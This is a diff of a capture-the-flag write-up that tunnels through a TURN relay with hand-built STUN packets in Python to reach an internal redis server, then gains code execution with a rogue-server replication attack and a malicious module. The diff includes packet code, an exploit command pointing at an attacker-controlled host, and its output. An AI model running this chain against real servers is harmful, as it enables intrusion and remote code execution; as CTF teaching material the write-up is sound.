@@ -78,11 +78,11 @@ It seems they used a tool called `stunner` but further research shows the tool i
 ### Going out of TURN
 
 There was a lot of reading RFCs to construct the packets, and then using wireshark to investigate the packets being sent and received. STUN 
-requests basically consist of a header that includes a message type, length, a magic cookie value, and a transaction id, and a series of attributes.  Capturing a few packets from the site itself, sent by the browsers helped in deciphering the structure.
+requests basically consist of a header that includes a message type, length, a magic cookie value, and a transaction id; as well as a series of attributes composed of a type, length, and value.  Capturing a few packets from the site itself, sent by the browsers helped in deciphering the structure.
 
 #### Allocation Request
 
-According to the RFC, the first of three requests we need is an allocation request.  The following code should build it.
+According to the RFC and hackerone write-up, the first of three requests we need to send is an allocation request.  The following code should build it.
 
 ```python
 CONNECTBIND_REQUEST = b'\x00\x0b'
@@ -131,8 +131,8 @@ trying to troubleshoot.  The attributes have a pattern of type, length, and then
 connection, and specifies how long it should live for.
 
 ```python
-HOST = '216.165.2.41'  # The server's hostname or IP address
-PORT = 3478        # The port used by the server
+HOST = '216.165.2.41'
+PORT = 3478
 
 def parse_response(data):
   print('Message Type', data[0:2])
@@ -149,12 +149,15 @@ def parse_response(data):
   attributes = data[20:20+msg_len]
   idx = 0
   while(idx < len(attributes)):
+    # extract next attribute type, length and value
     attr_type = attributes[idx:idx+2]
     idx += 2
     attr_len = int.from_bytes(attributes[idx:idx+2], "big")
     idx += 2
     value = attributes[idx:idx+attr_len]
     idx += attr_len
+
+    # switch on the attribute type, then parse and print the value
     if (attr_type == XOR_MAPPED_ADDRESS):
       print('attibute type XOR-MAPPED-ADDRESS')
       port = value[2:4]
@@ -322,7 +325,7 @@ def build_connect_request():
   return header + attributes
 ```
 
-And when we make our connect request attempt we get in response
+And when we make our connect request attempt, we get in response
 
 ```python
 generated txn id b'c1535cf939a61b388496cbe0'
@@ -417,37 +420,36 @@ KEYS *
 
 We type `KEYS *` and get a response, success! We now have a connection that behaves as if we have used telnet to connect a redis server.  
 Eventually the connection gets reset, and this may either be due to a restart mechanism on the server, or a lack of refresh requests on
-the control socket.  Either way, it stays open long enough we can get done pretty much whatever we like.  One thing of note, when closing
+the control socket.  Either way, it stays open long enough we can pretty much get done whatever we need to.  One thing of note, when closing
 the control socket, it seemed the data socket connection also was reset.
 
 ## Redis
 
-Now we move on to attacking redis.  After attempting most of the options outlined on https://book.hacktricks.xyz/pentesting/6379-pentesting-redis,
- we ended up searching for other options.  That's when we came across the following link https://medium.com/@knownsec404team/rce-exploits-of-redis-based-on-master-slave-replication-ef7a664ce1d0.  
-This blog outlines a pretty cool technique that utilizes components of previous techniques and some clever syncing between
-master and replica to load a custom module.  There are a few ingredients.
+Now we move on to attacking redis.  After attempting or ruling out most of the options outlined at https://book.hacktricks.xyz/pentesting/6379-pentesting-redis,
+ we ended up searching for other options.  That's when we came across the following post https://medium.com/@knownsec404team/rce-exploits-of-redis-based-on-master-slave-replication-ef7a664ce1d0.  This article outlines a pretty cool technique that utilizes components of previous techniques and some clever syncing between a
+master and a replica to load a custom module.  There are a few ingredients...
 
-First is that redis servers can be either replicas or masters.  The replica acts as a read-only backup, and the master is responsible for 
+First is that redis servers can be either replicas or masters.  The replicas act as read-only backups, and the masters are responsible for 
 writing.  So we can make the vulnerable redis server a replica of our own.  This means data from our own server will be 
 synchronized to the replica.
 
 Next is that redis allows for modules.  These are binaries that expose functionality via adding new commands to redis.  If we can
 can call `LOAD MODULE /path/to/exploit.so` with a malicious module, we can do whatever we like.  We only need to get the module
-file to replica.
+file to somewhere accessible on the replica server.
 
 Thirdly, it's possible to change the dbfilename and directory in the redis configuration at run time via `CONFIG SET dbfilename /path/to/exploit.so`, and `CONFIG SET DIR /tmp`. Then, when redis saves the current data to file, we can get arbitrary writes to file.  This can be 
 initiated by a `PSYNC` command, and then transferring the payload to the replica.
 
-Putting it together, we slave the target to our own server, configure the database filename, replicate the payload as data via sync, and
-then our payload ends up as a file on the target system.  After that we load the module and use our new commands.
+Putting it together, we slave the target to our own server, configure the database filename and directory, replicate the payload as data via 
+sync, and then our payload ends up as a file on the target system.  After that we load the module and use our new commands.
 
 Thankfully there is existing code for this: https://github.com/LoRexxar/redis-rogue-server.  This script acts as a rogue redis
 server and does most of the hard work for us.  We only need to provide it the connection to the target server and a payload.  The readme
-for this repo mentions another repo(https://github.com/n0b0dyCN/RedisModules-ExecuteCommand), which will allow you to build a module that adds a `system.exec` command to redis.  It looks like we have all the ingredients, lets start putting it together.
+for this repo mentions a redis module(https://github.com/n0b0dyCN/RedisModules-ExecuteCommand) that adds a `system.exec` command.  It looks like we have all the ingredients, lets start putting it together.
 
 ### The Payload
 
-All we really need to do here is clone the repo and run make, and although the compilation throws a few warnings, we have our payload.
+All we really need to do here is clone the repo and run make, and although the compilation throws a few warnings, we have our payload, `module.so`.  We'll also need to copy it into the same directory as the rogue server, renaming it `exp.so`, or modify the rogue server accordingly.
 
 ```sh
 ╭─zoey@virtual-parrot ~/sec/csaw/webrtc ‹master*› 
@@ -542,8 +544,8 @@ Assuming everything has gone to plan, we should now be able to run the exploit. 
 
 ```python
 ╭─zoey@virtual-parrot ~/sec/csaw/webrtc/redis-rogue-server ‹master*› 
-╰─$ ./redis-rogue-server.py --rhost redis-via-turn --rport 22473 --lhost 3.14.182.203 --lport 15240
-TARGET redis-via-turn:22473
+╰─$ ./redis-rogue-server.py --rhost redis-via-turn --rport 6379 --lhost 3.14.182.203 --lport 15240
+TARGET redis-via-turn:6379
 SERVER 3.14.182.203:15240
 generated txn id b'254c37dcf8487fa530d69a26'
 Raw Allocation Request Response b'\x01\x03\x00(!\x12\xa4B%L7\xdc\xf8H\x7f\xa50\xd6\x9a&\x00\x16\x00\x08\x00\x01\x9e\xb5\x8d\x03\xa4A\x00 \x00\x08\x00\x01\x8c\x08\xa9\n\xf3$\x00\r\x00\x04\x00\x00\x0e\x10\x80"\x00\x04None'
@@ -610,9 +612,9 @@ value None
 [->] b'$0\r\n\r\n'
 ```
 
-Looking at the output, it looks as if pretty much everything went to plan, except for when we run our new command.  The response is not
-quite what we expect.  Perhaps we need to make some additional changes to the rogue redis server code.  *Or*, we could just use our
-previous script and proxy in a new interactive connection we know that works already.
+Looking at the output, it looks as if pretty much everything went to plan, except for when we run our new `system.exec` command.  The
+response is not quite what we expect.  Perhaps we need to make some additional changes to the rogue redis server code.  *Or*, we could just use
+our previous script and proxy in a new interactive connection we know that works already.
 
 ```sh
 ╭─zoey@virtual-parrot ~/sec/csaw/webrtc ‹master*› 
